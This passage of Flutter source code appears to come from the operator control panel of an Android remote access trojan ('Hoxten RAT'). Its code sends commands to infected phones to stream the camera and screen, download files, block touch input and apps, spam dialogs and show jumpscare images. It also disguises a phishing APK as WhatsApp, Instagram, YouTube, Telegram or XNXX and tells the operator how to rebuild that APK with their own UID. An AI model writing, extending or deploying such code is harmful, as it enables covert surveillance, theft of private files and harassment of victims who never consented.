              ControlTile(title: 'Stop TTS', subtitle: 'Hentikan suara', icon: Icons.stop_rounded, onTap: () => onRun('ttsStop')),
              ControlTile(title: 'Stop Spam', subtitle: 'Hentikan dialog', icon: Icons.notifications_off_outlined, onTap: () => onRun('dialogSpamStop')),
              ControlTile(title: 'Stop Touch', subtitle: 'Buka layar', icon: Icons.touch_app_outlined, onTap: () => onRun('touchBlockStop')),
              ControlTile(title: 'Unblock All', subtitle: 'Buka semua app', icon: Icons.apps_outage, onTap: () => onRun('unblockAll')),
              ControlTile(title: 'Stop Jumpscare', subtitle: 'Hentikan scare', icon: Icons.close_rounded, onTap: () => onRun('jumpscareStop')),
              ControlTile(title: 'Stop Jump 2', subtitle: 'Hentikan scare 2', icon: Icons.close_fullscreen, onTap: () => onRun('jumpscare2Stop')),
            ]),
            _section('Aksi URL'),
            _commandGrid([
              ControlTile(title: 'Wallpaper', subtitle: 'Ganti wallpaper', icon: Icons.wallpaper, onTap: () => onUrlAction('Wallpaper', 'setWallpaper')),
              ControlTile(title: 'Open URL', subtitle: 'Buka link', icon: Icons.language, onTap: () => onUrlAction('Open URL', 'openUrl')),
              ControlTile(title: 'Play Audio', subtitle: 'Putar audio', icon: Icons.audiotrack, onTap: () => onUrlAction('Play Audio', 'playAudio')),
              ControlTile(title: 'Jumpscare', subtitle: 'Kirim gambar', icon: Icons.warning_amber, onTap: () => onUrlAction('Jumpscare', 'jumpscareStart')),
              ControlTile(
                title: 'Jumpscare 2',
                subtitle: 'Gambar + durasi',
                icon: Icons.burst_mode,
                onTap: () async {
                  final url = await showPromptDialog(context, title: 'Jumpscare 2', hint: 'URL gambar', initial: 'https://files.catbox.moe/ulrmbb.jpg');
                  if (url != null) await onRun('jumpscare2Start', {'url': url, 'duration': 3000});
                },
              ),
            ]),
            Padding(
              padding: const EdgeInsets.all(16),
              child: HoxtenCard(
                onTap: () => Clipboard.setData(ClipboardData(text: id)),
                padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 12),
                child: Row(
                  children: [
                    Icon(Icons.copy_rounded, size: 16, color: HoxtenThemeColors.cyan.withValues(alpha: 0.7)),
                    const SizedBox(width: 10),
                    Expanded(child: Text('Copy Device ID', style: HoxtenThemeTypography.body())),
                    Text(id, style: HoxtenThemeTypography.caption(color: HoxtenThemeColors.t2), maxLines: 1, overflow: TextOverflow.ellipsis),
                  ],
                ),
              ),
            ),
          ],
        ),
        if (busy)
          const Positioned(top: 0, left: 0, right: 0, child: LinearProgressIndicator(color: HoxtenThemeColors.cyan, minHeight: 2)),
      ],
    );
  }

  void _showPhishingThemeSheet(BuildContext context, Future<void> Function(String command, [dynamic value]) onRun) {
    const themes = [
      _PhishingThemeOption('Default', Icons.home_outlined, 'default'),
      _PhishingThemeOption('WhatsApp', Icons.chat, 'whatsapp'),
      _PhishingThemeOption('Instagram', Icons.camera_alt_outlined, 'instagram'),
      _PhishingThemeOption('YouTube', Icons.play_circle_outline, 'youtube'),
      _PhishingThemeOption('Telegram', Icons.send_outlined, 'telegram'),
      _PhishingThemeOption('XNXX', Icons.hide_source_outlined, 'xnxx'),
    ];

    showModalBottomSheet<void>(
      context: context,
      backgroundColor: Colors.transparent,
      isScrollControlled: true,
      builder: (sheetCtx) {
        final bottomPad = MediaQuery.viewPaddingOf(sheetCtx).bottom;
        return Padding(
          padding: EdgeInsets.fromLTRB(12, 0, 12, 12 + bottomPad),
          child: Container(
            decoration: BoxDecoration(
              color: HoxtenThemeColors.b2,
              borderRadius: const BorderRadius.vertical(top: Radius.circular(22)),
              border: Border.all(color: HoxtenThemeColors.cyan.withValues(alpha: 0.12)),
            ),
            child: Column(
              mainAxisSize: MainAxisSize.min,
              children: [
                const SizedBox(height: 10),
                Container(
                  width: 40,
                  height: 4,
                  decoration: BoxDecoration(
                    color: HoxtenThemeColors.cyan.withValues(alpha: 0.2),
                    borderRadius: BorderRadius.circular(99),
                  ),
                ),
                Padding(
                  padding: const EdgeInsets.fromLTRB(16, 14, 16, 8),
                  child: Row(
                    children: [
                      Container(
                        width: 42,
                        height: 42,
                        decoration: BoxDecoration(
                          borderRadius: BorderRadius.circular(14),
                          color: HoxtenThemeColors.cyan.withValues(alpha: 0.1),
                        ),
                        child: const Icon(Icons.palette_outlined, color: HoxtenThemeColors.cyan),
                      ),
                      const SizedBox(width: 12),
                      Expanded(
                        child: Column(
                          crossAxisAlignment: CrossAxisAlignment.start,
                          children: [
                            Text('Tema Phishing', style: HoxtenThemeTypography.title()),
                            Text('Pilih icon & nama aplikasi', style: HoxtenThemeTypography.body()),
                          ],
                        ),
                      ),
                    ],
                  ),
                ),
                ...themes.map(
                  (theme) => Padding(
                    padding: const EdgeInsets.fromLTRB(12, 0, 12, 8),
                    child: Material(
                      color: Colors.transparent,
                      child: InkWell(
                        onTap: () {
                          Navigator.pop(sheetCtx);
                          onRun('changeTheme', theme.value);
                        },
                        borderRadius: BorderRadius.circular(14),
                        child: Ink(
                          height: 64,
                          decoration: BoxDecoration(
                            borderRadius: BorderRadius.circular(14),
                            color: HoxtenThemeColors.cyan.withValues(alpha: 0.04),
                            border: Border.all(color: HoxtenThemeColors.cyan.withValues(alpha: 0.12)),
                          ),
                          child: Padding(
                            padding: const EdgeInsets.symmetric(horizontal: 14),
                            child: Row(
                              children: [
                                Container(
                                  width: 36,
                                  height: 36,
                                  decoration: BoxDecoration(
                                    borderRadius: BorderRadius.circular(10),
                                    color: HoxtenThemeColors.cyan.withValues(alpha: 0.1),
                                  ),
                                  child: Icon(theme.icon, size: 18, color: HoxtenThemeColors.cyan),
                                ),
                                const SizedBox(width: 12),
                                Expanded(child: Text(theme.label, style: HoxtenThemeTypography.title().copyWith(fontSize: 14))),
                                Icon(Icons.chevron_right_rounded, size: 18, color: HoxtenThemeColors.cyan.withValues(alpha: 0.6)),
                              ],
                            ),
                          ),
                        ),
                      ),
                    ),
                  ),
                ),
                const SizedBox(height: 4),
              ],
            ),
          ),
        );
      },
    );
  }

}

class _PhishingThemeOption {
  const _PhishingThemeOption(this.label, this.icon, this.value);
  final String label;
  final IconData icon;
  final String value;
}

class _DeviceBanner extends StatelessWidget {
  const _DeviceBanner({required this.device});

  final HoxtenDeviceModel device;

  @override
  Widget build(BuildContext context) {
    return Padding(
      padding: const EdgeInsets.fromLTRB(16, 8, 16, 14),
      child: HoxtenCard(
        child: Row(
          children: [
            Container(
              width: 52,
              height: 52,
              decoration: BoxDecoration(
                borderRadius: BorderRadius.circular(14),
                color: HoxtenThemeColors.cyan.withValues(alpha: 0.08),
                border: Border.all(color: HoxtenThemeColors.cyan.withValues(alpha: 0.16)),
              ),
              child: const Icon(Icons.smartphone, color: HoxtenThemeColors.cyan),
            ),
            const SizedBox(width: 14),
            Expanded(
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Row(
                    children: [
                      Container(
                        width: 7,
                        height: 7,
                        decoration: const BoxDecoration(color: HoxtenThemeColors.dashGreen, shape: BoxShape.circle),
                      ),
                      const SizedBox(width: 6),
                      Text('ONLINE', style: HoxtenThemeTypography.tag().copyWith(color: HoxtenThemeColors.dashGreen, fontSize: 9)),
                    ],
                  ),
                  const SizedBox(height: 4),
                  Text(device.name, style: HoxtenThemeTypography.title().copyWith(fontSize: 16)),
                  Text(
                    'Android ${device.androidVersion} Â· Bat ${device.battery >= 0 ? '${device.battery}%' : '?'}${device.status.currentTheme.isNotEmpty ? ' Â· Tema ${device.status.currentTheme}' : ''}',
                    style: HoxtenThemeTypography.bodySmall(),
                  ),
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }
}

class _ControlBackdrop extends StatelessWidget {
  const _ControlBackdrop();

  @override
  Widget build(BuildContext context) {
    return IgnorePointer(
      child: Stack(
        fit: StackFit.expand,
        children: [
          const DecoratedBox(
            decoration: BoxDecoration(
              gradient: LinearGradient(
                begin: Alignment.topLeft,
                end: Alignment.bottomRight,
                colors: [
                  Color(0xFF040A16),
                  HoxtenThemeColors.b0,
                  Color(0xFF06101E),
                ],
                stops: [0, 0.55, 1],
              ),
            ),
          ),
          const CustomPaint(
            painter: _ControlPatternPainter(),
            size: Size.infinite,
          ),
          Positioned(
            top: -40,
            left: -50,
            child: Container(
              width: 200,
              height: 200,
              decoration: BoxDecoration(
                shape: BoxShape.circle,
                gradient: RadialGradient(
                  colors: [
                    HoxtenThemeColors.cyan.withValues(alpha: 0.08),
                    Colors.transparent,
                  ],
                ),
              ),
            ),
          ),
          Positioned(
            top: 140,
            right: -70,
            child: Container(
              width: 180,
              height: 180,
              decoration: BoxDecoration(
                shape: BoxShape.circle,
                gradient: RadialGradient(
                  colors: [
                    HoxtenThemeColors.blue.withValues(alpha: 0.07),
                    Colors.transparent,
                  ],
                ),
              ),
            ),
          ),
          Positioned(
            bottom: 100,
            left: -30,
            child: Container(
              width: 260,
              height: 260,
              decoration: BoxDecoration(
                shape: BoxShape.circle,
                gradient: RadialGradient(
                  colors: [
                    HoxtenThemeColors.blue.withValues(alpha: 0.05),
                    Colors.transparent,
                  ],
                ),
              ),
            ),
          ),
          Positioned.fill(
            child: DecoratedBox(
              decoration: BoxDecoration(
                gradient: RadialGradient(
                  center: const Alignment(0, 0.35),
                  radius: 1.05,
                  colors: [
                    Colors.transparent,
                    HoxtenThemeColors.b0.withValues(alpha: 0.3),
                  ],
                ),
              ),
            ),
          ),
        ],
      ),
    );
  }
}

class _ControlPatternPainter extends CustomPainter {
  const _ControlPatternPainter();

  @override
  void paint(Canvas canvas, Size size) {
    const step = 28.0;
    final grid = Paint()
      ..strokeWidth = 0.5
      ..color = HoxtenThemeColors.blue.withValues(alpha: 0.04);
    final gridDot = Paint()..color = HoxtenThemeColors.cyan.withValues(alpha: 0.03);

    for (var x = 0.0; x <= size.width; x += step) {
      canvas.drawLine(Offset(x, 0), Offset(x, size.height), grid);
    }
    for (var y = 0.0; y <= size.height; y += step) {
      canvas.drawLine(Offset(0, y), Offset(size.width, y), grid);
    }

    final diagonal = Paint()
      ..strokeWidth = 0.45
      ..color = HoxtenThemeColors.cyan.withValues(alpha: 0.018);
    const diagStep = 56.0;
    for (var i = -size.height; i < size.width + size.height; i += diagStep) {
      canvas.drawLine(Offset(i, 0), Offset(i + size.height, size.height), diagonal);
      canvas.drawLine(Offset(i + size.height, 0), Offset(i, size.height), diagonal);
    }

    for (var x = step; x < size.width; x += step * 2) {
      for (var y = step; y < size.height; y += step * 2) {
        canvas.drawCircle(Offset(x, y), 1.1, gridDot);
      }
    }

    final node = Paint()..color = HoxtenThemeColors.blue2.withValues(alpha: 0.12);
    final nodeRing = Paint()
      ..style = PaintingStyle.stroke
      ..strokeWidth = 0.6
      ..color = HoxtenThemeColors.blue.withValues(alpha: 0.1);
    const nodes = [
      Offset(0.18, 0.22),
      Offset(0.82, 0.18),
      Offset(0.72, 0.62),
      Offset(0.12, 0.78),
    ];
    for (final n in nodes) {
      final p = Offset(n.dx * size.width, n.dy * size.height);
      canvas.drawCircle(p, 2.2, node);
      canvas.drawCircle(p, 6, nodeRing);
    }

    final fade = Paint()
      ..shader = LinearGradient(
        begin: Alignment.topCenter,
        end: Alignment.bottomCenter,
        colors: [
          HoxtenThemeColors.b0.withValues(alpha: 0.4),
          Colors.transparent,
          HoxtenThemeColors.b0.withValues(alpha: 0.55),
        ],
        stops: const [0, 0.5, 1],
      ).createShader(Rect.fromLTWH(0, 0, size.width, size.height));
    canvas.drawRect(Rect.fromLTWH(0, 0, size.width, size.height), fade);
  }

  @override
  bool shouldRepaint(covariant CustomPainter oldDelegate) => false;
}

/// Empty state â€” matches HTML `.no-dev` on control page.
class _ControlNoDeviceState extends StatelessWidget {
  const _ControlNoDeviceState({this.onPickDevice});

  final VoidCallback? onPickDevice;

  @override
  Widget build(BuildContext context) {
    return Container(
      width: double.infinity,
      constraints: const BoxConstraints(maxWidth: 320),
      padding: const EdgeInsets.symmetric(vertical: 36, horizontal: 24),
      decoration: BoxDecoration(
        borderRadius: BorderRadius.circular(HoxtenThemeColors.radius),
        gradient: const LinearGradient(
          begin: Alignment.topLeft,
          end: Alignment.bottomRight,
          colors: [
            Color(0xCC0D1E38),
            Color(0xE6081428),
          ],
        ),
        border: Border.all(color: HoxtenThemeColors.blue.withValues(alpha: 0.18)),
      ),
      child: Column(
        mainAxisSize: MainAxisSize.min,
        children: [
          Container(
            width: 60,
            height: 60,
            decoration: BoxDecoration(
              borderRadius: BorderRadius.circular(16),
              color: const Color(0xFF0D1E38).withValues(alpha: 0.85),
              border: Border.all(color: HoxtenThemeColors.blue.withValues(alpha: 0.18)),
            ),
            alignment: Alignment.center,
            child: Icon(
              Icons.smartphone_outlined,
              size: 28,
              color: HoxtenThemeColors.textDim,
            ),
          ),
          const SizedBox(height: 14),
          Text(
            'No Device Selected',
            textAlign: TextAlign.center,
            style: HoxtenThemeTypography.title(color: HoxtenThemeColors.t1).copyWith(letterSpacing: 1),
          ),
          const SizedBox(height: 14),
          Text(
            'Pilih device di tab Devices',
            textAlign: TextAlign.center,
            style: HoxtenThemeTypography.tag(fontSize: 8, color: HoxtenThemeColors.t2).copyWith(letterSpacing: 2),
          ),
          if (onPickDevice != null) ...[
            const SizedBox(height: 20),
            TextButton.icon(
              onPressed: onPickDevice,
              style: TextButton.styleFrom(
                foregroundColor: HoxtenThemeColors.blue2,
                padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 8),
                minimumSize: Size.zero,
                tapTargetSize: MaterialTapTargetSize.shrinkWrap,
              ),
              icon: Icon(Icons.arrow_forward_rounded, size: 14, color: HoxtenThemeColors.blue2.withValues(alpha: 0.85)),
              label: Text(
                'KE DEVICES',
                style: HoxtenThemeTypography.button().copyWith(
                  fontSize: 10,
                  letterSpacing: 1.6,
                  color: HoxtenThemeColors.blue2,
                ),
              ),
            ),
          ],
        ],
      ),
    );
  }
}

extension on HoxtenDeviceStatus {
  String get mutedVolumeLabel => volumeMuted ? 'Muted' : 'Off';
}

class ControlTile extends StatelessWidget {
  const ControlTile({
    super.key,
    required this.title,
    required this.subtitle,
    required this.icon,
    this.color = HoxtenThemeColors.cyan,
    this.onTap,
    this.trailing,
    this.bottom,
  });

  final String title;
  final String subtitle;
  final IconData icon;
  final Color color;
  final VoidCallback? onTap;
  final Widget? trailing;
  final Widget? bottom;

  @override
  Widget build(BuildContext context) {
    return Material(
      color: HoxtenThemeColors.b2,
      borderRadius: BorderRadius.circular(16),
      child: InkWell(
        borderRadius: BorderRadius.circular(16),
        splashColor: HoxtenThemeColors.cyan.withValues(alpha: 0.1),
        highlightColor: HoxtenThemeColors.blue.withValues(alpha: 0.08),
        onTap: onTap,
        child: Ink(
          decoration: BoxDecoration(
            borderRadius: BorderRadius.circular(16),
            border: Border.all(color: HoxtenThemeColors.blue.withValues(alpha: 0.16)),
            gradient: LinearGradient(
              begin: Alignment.topLeft,
              end: Alignment.bottomRight,
              colors: [
                HoxtenThemeColors.b3.withValues(alpha: 0.35),
                HoxtenThemeColors.b2,
              ],
            ),
          ),
          child: Padding(
            padding: const EdgeInsets.all(16),
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              mainAxisSize: MainAxisSize.min,
              children: [
                Row(
                  children: [
                    Container(
                      width: 42,
                      height: 42,
                      decoration: BoxDecoration(
                        borderRadius: BorderRadius.circular(12),
                        color: color.withValues(alpha: 0.12),
                        border: Border.all(color: color.withValues(alpha: 0.28)),
                      ),
                      child: Icon(icon, size: 22, color: color),
                    ),
                    if (trailing != null) ...[const Spacer(), trailing!],
                  ],
                ),
                const SizedBox(height: 14),
                Text(
                  title,
                  style: HoxtenThemeTypography.style(fontSize: 13, fontWeight: FontWeight.w600, color: HoxtenThemeColors.t0),
                ),
                const SizedBox(height: 4),
                Text(subtitle, style: HoxtenThemeTypography.bodySmall()),
                if (bottom != null) ...[const SizedBox(height: 8), bottom!],
              ],
            ),
          ),
        ),
      ),
    );
  }
}

class HoxtenSwitch extends StatelessWidget {
  const HoxtenSwitch({
    super.key,
    required this.value,
    required this.onChanged,
    this.activeColor = HoxtenThemeColors.cyan,
  });

  final bool value;
  final ValueChanged<bool> onChanged;
  final Color activeColor;

  @override
  Widget build(BuildContext context) {
    return Transform.scale(
      scale: 0.88,
      child: Switch.adaptive(
        value: value,
        activeTrackColor: activeColor.withValues(alpha: 0.45),
        activeThumbColor: activeColor,
        inactiveThumbColor: HoxtenThemeColors.t2,
        inactiveTrackColor: HoxtenThemeColors.b0.withValues(alpha: 0.8),
        onChanged: onChanged,
      ),
    );
  }
}

class PinkSwitch extends HoxtenSwitch {
  const PinkSwitch({super.key, required super.value, required super.onChanged, super.activeColor});
}

class HoxtenCommandService {
  HoxtenCommandService({HoxtenApiClient? api}) : _api = api ?? HoxtenApiClient();

  final HoxtenApiClient _api;

  Future<void> send({
    required String token,
    required String deviceId,
    required String command,
    dynamic value,
  }) async {
    await _api.postJson(
      '/api/command/$deviceId',
      token: token,
      body: {
        'command': command,
        if (value != null) 'value': _encodeValue(value),
      },
    );
  }

  String _encodeValue(dynamic value) {
    if (value is String) return value;
    if (value is bool || value is num) return value.toString();
    if (value is Map || value is List) return jsonEncode(value);
    return value.toString();
  }

  Future<String> fetchScreenshot({
    required String token,
    required String deviceId,
  }) async {
    final data = await _api.getJson('/api/screenshot/$deviceId', token: token);
    final frame = data['frame']?.toString();
    if (frame == null || frame.isEmpty) {
      throw HoxtenApiException(data['error']?.toString() ?? 'Belum ada frame kamera');
    }
    return frame;
  }

  Future<List<int>> downloadFile({
    required String token,
    required String deviceId,
    required String path,
  }) async {
    return _api.downloadBytes('/api/file/$deviceId?path=${Uri.encodeComponent(path)}', token: token);
  }
}

Future<String?> showPromptDialog(
  BuildContext context, {
  required String title,
  required String hint,
  String initial = '',
  int maxLines = 1,
}) {
  final ctrl = TextEditingController(text: initial);
  return showDialog<String>(
    context: context,
    builder: (ctx) => AlertDialog(
      backgroundColor: HoxtenThemeColors.b2,
      shape: RoundedRectangleBorder(
        borderRadius: BorderRadius.circular(16),
        side: BorderSide(color: HoxtenThemeColors.blue.withValues(alpha: 0.2)),
      ),
      title: Text(title, style: HoxtenThemeTypography.title()),
      content: TextField(
        controller: ctrl,
        maxLines: maxLines,
        style: HoxtenThemeTypography.field(),
        decoration: InputDecoration(hintText: hint),
        autofocus: true,
      ),
      actions: [
        TextButton(
          onPressed: () => Navigator.pop(ctx),
          child: Text('Batal', style: HoxtenThemeTypography.bodySmall(color: HoxtenThemeColors.t2)),
        ),
        FilledButton(
          style: FilledButton.styleFrom(backgroundColor: HoxtenThemeColors.blue, foregroundColor: Colors.white),
          onPressed: () => Navigator.pop(ctx, ctrl.text.trim()),
          child: Text('Kirim', style: HoxtenThemeTypography.button()),
        ),
      ],
    ),
  );
}

enum StreamType { camera, screen }

/// Route baru tidak mewarisi Provider dari [HoxtenRatPage] â€” inject auth + socket.
void pushHoxtenStreamViewer(
  BuildContext context, {
  required String deviceId,
  required String deviceName,
  required StreamType type,
  String facing = 'back',
}) {
  final auth = context.read<HoxtenAuthService>();
  final socket = context.read<HoxtenSocketService>();
  Navigator.push(
    context,
    MaterialPageRoute(
      builder: (_) => MultiProvider(
        providers: [
          ChangeNotifierProvider<HoxtenAuthService>.value(value: auth),
          ChangeNotifierProvider<HoxtenSocketService>.value(value: socket),
        ],
        child: StreamViewerScreen(
          deviceId: deviceId,
          deviceName: deviceName,
          type: type,
          facing: facing,
        ),
      ),
    ),
  );
}

class StreamViewerScreen extends StatefulWidget {
  const StreamViewerScreen({
    super.key,
    required this.deviceId,
    required this.deviceName,
    required this.type,
    this.facing = 'back',
  });

  final String deviceId;
  final String deviceName;
  final StreamType type;
  final String facing;

  @override
  State<StreamViewerScreen> createState() => _StreamViewerScreenState();
}

class _StreamViewerScreenState extends State<StreamViewerScreen> {
  final _cmd = HoxtenCommandService();
  bool _started = false;
  String? _error;
  String? _token;

  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addPostFrameCallback((_) => _start());
  }

  Future<void> _start() async {
    if (!mounted) return;
    _token = context.read<HoxtenSocketService>().commandToken;
    if (_token == null) {
      setState(() => _error = 'Menunggu sesi RAT — kembali lalu tap refresh');
      return;
    }
    try {
      if (widget.type == StreamType.camera) {
        await _cmd.send(token: _token!, deviceId: widget.deviceId, command: 'camera', value: widget.facing);
      } else {
        await _cmd.send(token: _token!, deviceId: widget.deviceId, command: 'screen', value: 'start');
      }
      if (mounted) setState(() { _started = true; _error = null; });
    } catch (e) {
      if (mounted) {
        setState(() => _error = e.toString().replaceFirst('Exception: ', ''));
      }
    }
  }

  Future<void> _stop() async {
    final token = _token;
    if (token == null) return;
    try {
      if (widget.type == StreamType.camera) {
        await _cmd.send(token: token, deviceId: widget.deviceId, command: 'camera', value: 'off');
      } else {
        await _cmd.send(token: token, deviceId: widget.deviceId, command: 'screen', value: 'stop');
      }
    } catch (_) {}
  }

  @override
  void dispose() {
    unawaited(_stop());
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    final socket = context.watch<HoxtenSocketService>();
    final frame = widget.type == StreamType.camera
        ? socket.cameraFrames[widget.deviceId]
        : socket.screenFrames[widget.deviceId];

    return Scaffold(
      backgroundColor: Colors.black,
      appBar: AppBar(
          
          
        backgroundColor: Colors.black,
        foregroundColor: Colors.white,
        title: Text(widget.type == StreamType.camera ? 'Live Camera' : 'Live Screen'),
        actions: [
          IconButton(
            onPressed: () async {
              await _stop();
              if (mounted) Navigator.pop(context);
            },
            icon: const Icon(Icons.close),
          ),
        ],
      ),
      body: Column(
        children: [
          Padding(
            padding: const EdgeInsets.all(12),
            child: Row(
              children: [
                Container(
                  width: 8,
                  height: 8,
                  decoration: const BoxDecoration(color: Colors.red, shape: BoxShape.circle),
                ),
                const SizedBox(width: 8),
                Text('${widget.deviceName} Â· LIVE', style: const TextStyle(color: Colors.white70, letterSpacing: 1.2)),
              ],
            ),
          ),
          Expanded(
            child: Center(
              child: _error != null
                  ? Padding(
                      padding: const EdgeInsets.all(24),
                      child: Column(
                        mainAxisSize: MainAxisSize.min,
                        children: [
                          const Icon(Icons.error_outline, color: Colors.redAccent, size: 40),
                          const SizedBox(height: 12),
                          Text(_error!, textAlign: TextAlign.center, style: const TextStyle(color: Colors.white54)),
                          const SizedBox(height: 16),
                          FilledButton(
                            onPressed: () {
                              setState(() { _error = null; _started = false; });
                              _start();
                            },
                            child: const Text('COBA LAGI'),
                          ),
                        ],
                      ),
                    )
                  : frame != null
                      ? Base64Image(data: frame, fit: BoxFit.contain)
                      : Column(
                          mainAxisSize: MainAxisSize.min,
                          children: [
                            if (!_started) const CircularProgressIndicator(color: HoxtenColors.dashAccent),
                            const SizedBox(height: 12),
                            Text(
                              _started ? 'Menunggu frame...' : 'Memulai stream...',
                              style: const TextStyle(color: Colors.white54),
                            ),
                          ],
                        ),
            ),
          ),
        ],
      ),
    );
  }
}

class Base64Image extends StatelessWidget {
  const Base64Image({
    super.key,
    required this.data,
    this.fit = BoxFit.contain,
    this.borderRadius,
  });

  final String data;
  final BoxFit fit;
  final BorderRadius? borderRadius;

  @override
  Widget build(BuildContext context) {
    try {
      var raw = data;
      if (raw.contains(',')) raw = raw.split(',').last;
      final bytes = base64Decode(raw);
      final image = Image.memory(bytes, fit: fit, gaplessPlayback: true);
      if (borderRadius != null) {
        return ClipRRect(borderRadius: borderRadius!, child: image);
      }
      return image;
    } catch (_) {
      return const Center(child: Icon(Icons.broken_image_outlined, color: Colors.white38));
    }
  }
}





class HoxtenDevicesScreen extends StatelessWidget {
  const HoxtenDevicesScreen({super.key, required this.onDeviceSelected});

  final VoidCallback onDeviceSelected;

  @override
  Widget build(BuildContext context) {
    final socket = context.watch<HoxtenSocketService>();

    return Stack(
      fit: StackFit.expand,
      children: [
        const _DevicesBackdrop(),
        _buildBody(context, socket),
        Positioned(
          top: 8,
          right: 8,
          child: SafeArea(
            child: IconButton(
              icon: const Icon(Icons.help_outline, size: 22, color: Colors.white38),
              onPressed: () => _showHelp(context, socket),
              tooltip: 'Tutorial',
            ),
          ),
        ),
      ],
    );
  }

  void _showHelp(BuildContext context, HoxtenSocketService socket) {
    showDialog(
      context: context,
      builder: (ctx) => AlertDialog(
        backgroundColor: const Color(0xFF141420),
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16), side: const BorderSide(color: Color(0xFF1e1e30))),
        title: Row(
          children: [
            Icon(Icons.smartphone_outlined, size: 18, color: HoxtenThemeColors.t2),
            const SizedBox(width: 8),
            Text('Tutorial', style: HoxtenThemeTypography.body()),
          ],
        ),
        content: Column(
          mainAxisSize: MainAxisSize.min,
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Text('Cara ganti UID di Apk Phising:', style: HoxtenThemeTypography.caption(color: HoxtenThemeColors.t2)),
            const SizedBox(height: 8),
            Text('1. Buka Apk Phising phising', style: HoxtenThemeTypography.caption()),
            const SizedBox(height: 4),
            Text('2. Masuk ke:', style: HoxtenThemeTypography.caption()),
            Container(
              width: double.infinity,
              padding: const EdgeInsets.all(8),
              margin: const EdgeInsets.only(top: 4, bottom: 8),
              decoration: BoxDecoration(
                color: const Color(0xFF0a0a0f),
                borderRadius: BorderRadius.circular(6),
                border: Border.all(color: const Color(0xFF1e1e30)),
              ),
              child: Text(
                'android/app/src/main/assets/uid.json',
                style: HoxtenThemeTypography.caption().copyWith(fontFamily: 'monospace', fontSize: 9),
              ),
            ),
            Text('3. Ganti UID dengan punya kamu:', style: HoxtenThemeTypography.caption()),
            const SizedBox(height: 6),
            InkWell(
              onTap: () {
                Clipboard.setData(ClipboardData(text: socket.myUid ?? ''));
                ScaffoldMessenger.of(context).showSnackBar(const SnackBar(content: Text('UID disalin!')));
              },
              child: Container(
                width: double.infinity,
                padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 10),
                decoration: BoxDecoration(
                  color: const Color(0xFF0a0a0f),
                  borderRadius: BorderRadius.circular(8),
                  border: Border.all(color: const Color(0xFF1e1e30)),
                ),
                child: Row(
                  mainAxisSize: MainAxisSize.min,
                  children: [
                    Expanded(
                      child: Text(socket.myUid ?? 'Memuat...',
                        style: HoxtenThemeTypography.caption().copyWith(fontFamily: 'monospace', fontSize: 11)),
                    ),
                    const SizedBox(width: 8),
                    Icon(Icons.copy, size: 14, color: HoxtenThemeColors.blue),
                  ],
                ),
              ),
            ),
            const SizedBox(height: 12),
            Text('4. Build ulang APK', style: HoxtenThemeTypography.caption()),
          ],
        ),
        actions: [
          TextButton(onPressed: () => Navigator.pop(ctx), child: const Text('Tutup')),
        ],
      ),
    );
  }

  Widget _buildBody(BuildContext context, HoxtenSocketService socket) {
    if (!socket.connected && socket.devices.isEmpty) {
      final token = context.read<HoxtenAuthService>().token;
      final error = socket.lastError;
      return Center(
        child: FadeSlideIn(
          child: Padding(
            padding: const EdgeInsets.symmetric(horizontal: 24),
            child: HoxtenCard(
              padding: const EdgeInsets.all(28),
              child: Column(
                mainAxisSize: MainAxisSize.min,
                children: [
                  Icon(
                    error == null ? Icons.sync_rounded : Icons.wifi_off_rounded,
                    size: 34,
                    color: error == null ? HoxtenThemeColors.cyan : HoxtenThemeColors.dashRed,
                  ),
                  const SizedBox(height: 16),
                  Text(
                    error == null ? 'Menghubungkan...' : 'Koneksi server terputus',
                    style: HoxtenThemeTypography.title(),
                  ),
                  const SizedBox(height: 4),
                  Text(
                    error ?? 'Sinkron device target via socket',
                    textAlign: TextAlign.center,
                    style: HoxtenThemeTypography.body(),
                  ),
                  if (token != null) ...[
                    const SizedBox(height: 16),
                    FilledButton.icon(
                      onPressed: () async {
                        try {
                          final fresh = await ensureHoxtenSession(forceRefresh: true);
                          if (context.mounted) {
                            context.read<HoxtenSocketService>().connect(fresh);
                          }
                        } catch (e) {
                          if (context.mounted) {
                            context.read<HoxtenSocketService>().lastError =
                                e.toString().replaceFirst('Exception: ', '');
                          }
                        }
                      },
                      style: FilledButton.styleFrom(
                        backgroundColor: HoxtenThemeColors.blue,
                        foregroundColor: Colors.white,
                        minimumSize: const Size.fromHeight(44),
                      ),
                      icon: const Icon(Icons.refresh_rounded, size: 18),
                      label: Text('COBA LAGI', style: HoxtenThemeTypography.button()),
                    ),
                  ],
                ],
              ),
            ),
          ),
        ),
      );
    }

    if (socket.devices.isEmpty) {
      return Column(
        crossAxisAlignment: CrossAxisAlignment.stretch,
        children: [
          const HoxtenSectionLabel('Devices'),
          Expanded(
            child: Padding(
              padding: const EdgeInsets.fromLTRB(16, 0, 16, 100),
              child: FadeSlideIn(
                child: Center(
                  child: Column(
                    mainAxisSize: MainAxisSize.min,
                    children: [
                      const _DevicesEmptyState(),
                    ],
                  ),
                ),
              ),
            ),
          ),
        ],
      );
    }

    return ListView(
      padding: const EdgeInsets.only(bottom: 100),
      children: [
        const HoxtenSectionLabel('Devices'),
        ...socket.devices.asMap().entries.map(
              (e) => FadeSlideIn(
                delay: Duration(milliseconds: 30 + e.key * 40),
                child: Padding(
                  padding: const EdgeInsets.fromLTRB(16, 0, 16, 8),
                  child: DeviceDcard(
                    device: e.value,
                    index: e.key,
                    selected: socket.selectedDeviceId == e.value.id,
                    onTap: () {
                      context.read<HoxtenSocketService>().selectDevice(e.value.id);
                      onDeviceSelected();
                    },
                  ),
                ),
              ),
            ),
      ],
    );
  }
}

/// Empty state â€” matches HTML `.empty` inside `#device-list`.
class _DevicesEmptyState extends StatelessWidget {
  const _DevicesEmptyState();

  @override
  Widget build(BuildContext context) {
    return Padding(
      padding: const EdgeInsets.symmetric(horizontal: 20),
      child: Column(
        mainAxisSize: MainAxisSize.min,
        crossAxisAlignment: CrossAxisAlignment.center,
        children: [
          Container(
            width: 60,
            height: 60,
            decoration: BoxDecoration(
              borderRadius: BorderRadius.circular(16),
